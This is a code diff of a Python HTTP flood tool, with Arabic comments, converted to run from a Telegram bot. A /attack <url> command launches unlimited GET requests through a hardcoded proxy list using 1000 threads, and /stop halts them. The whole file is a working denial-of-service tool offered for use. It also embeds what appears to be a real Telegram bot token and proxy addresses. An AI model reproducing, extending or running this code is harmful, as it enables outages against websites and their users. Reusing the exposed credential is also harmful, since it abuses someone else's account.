@@ -1,85 +1,83 @@
+
 import time
 import requests
 import threading
-import random
 from concurrent.futures import ThreadPoolExecutor
+import telebot
+
+# Your Telegram bot token
+API_TOKEN = '7823594166:AAG5HvvfOnliCBVKu9VsnzmCgrQb68m91go'
+
+bot = telebot.TeleBot(API_TOKEN)
 
 # Constants
 lock = threading.Lock()
 protection_active = False
 
-def send_request(url, method, retries=3, proxies=None):
-    """إرسال طلب باستخدام الطريقة HTTP المحددة والبروكسي."""
+def send_request(url, proxy, retries=3):
+    """إرسال طلب GET باستخدام بروكسي."""
     for attempt in range(retries):
         try:
-            proxy = {"http": proxies, "https": proxies} if proxies else None
-            response = requests.request(method, url, timeout=5, proxies=proxy)
+            proxies = {"http": proxy, "https": proxy}
+            response = requests.get(url, timeout=5, proxies=proxies)
             return response.status_code
         except requests.RequestException:
-            # تجاهل الخطأ بصمت
             if attempt < retries - 1:
-                time.sleep(0.5)  # تقليل زمن الانتظار بين المحاولات
-
+                time.sleep(0.0)  # تقليل زمن الانتظار بين المحاولات
     return None
 
-def flood(url, count, interval, methods, proxies_list):
-    """تنفيذ هجوم الفيضانات باستخدام المعلمات المحددة."""
+def flood(url, proxies_list):
+    """تنفيذ هجوم الفيضانات على URL باستخدام طلبات GET غير محدودة."""
     global protection_active
     total_sent = 0
 
-    with ThreadPoolExecutor(max_workers=1000) as executor:
-        futures = []
-        while protection_active and (count == -1 or total_sent < count):
-            for method in methods:
-                proxy = random.choice(proxies_list) if proxies_list else None
-                futures.append(executor.submit(send_request, url, method, proxies=proxy))
-                total_sent += 1
-
-            if interval > 0:
-                time.sleep(interval)
-
-            if total_sent % 4000 == 0:
+    def task(proxy):
+        send_request(url, proxy)
+        with lock:
+            nonlocal total_sent
+            total_sent += 1
+            if total_sent % 1000 == 0:
                 print(f"Total requests sent: {total_sent}")
+
+    with ThreadPoolExecutor(max_workers=1000) as executor:
+        while protection_active:
+            for proxy in proxies_list:
+                executor.submit(task, proxy)
 
     print(f"Final total requests sent: {total_sent}")
 
-def main():
+# Define your proxies here with correct format
+proxies_list = [
+    "http://179.60.183.100:50100",
+    "http://179.60.183.98:50100",
+    "http://179.60.183.201:50100",
+    "http://179.60.183.146:50100",
+    "http://193.169.218.254:50100"
+    # Add more proxies as needed
+]
+
+@bot.message_handler(commands=['attack'])
+def handle_attack(message):
     global protection_active
 
-    # Define your proxies here with correct format
-    proxies_list = [
-        "http://179.60.183.100:50100",
-        "http://179.60.183.98:50100",
-        "http://179.60.183.201:50100",
-        "http://179.60.183.146:50100",
-        "http://193.169.218.254:50100"
-        # Add more proxies as needed
-    ]
+    try:
+        url = message.text.split()[1]
+    except IndexError:
+        bot.send_message(message.chat.id, "Usage: /attack <url>")
+        return
 
-    while True:
-        command = input("Enter command (attack/stop/exit): ").strip().lower()
+    protection_active = True
+    bot.send_message(message.chat.id, f"Starting flood for {url} with GET requests...")
+    flood(url, proxies_list)
 
-        if command == "attack":
-            url = input("Enter the URL to attack: ").strip()
-            packet_count = int(input("Enter the number of requests (-1 for infinite): ").strip())
-            interval = float(input("Enter the interval between requests (in seconds): ").strip())
-            selected_methods = input("Enter HTTP methods (comma-separated, e.g., GET,POST): ").strip().split(',')
+@bot.message_handler(commands=['stop'])
+def handle_stop(message):
+    global protection_active
+    protection_active = False
+    bot.send_message(message.chat.id, "Stopping flood...")
 
-            protection_active = True
-            methods = [method.strip().upper() for method in selected_methods]
-            print(f"Starting flood for {url} with methods: {methods}...")
-            flood(url, packet_count, interval, methods, proxies_list)
+@bot.message_handler(commands=['start', 'help'])
+def handle_start_help(message):
+    bot.send_message(message.chat.id, "Commands:\n/attack <url>\n/stop")
 
-        elif command == "stop":
-            protection_active = False
-            print("Stopping flood...")
-
-        elif command == "exit":
-            print("Exiting program...")
-            break
-
-        else:
-            print("Unknown command. Please use 'attack', 'stop', or 'exit'.")
-
-if __name__ == "__main__":
-    main()
+bot.polling()
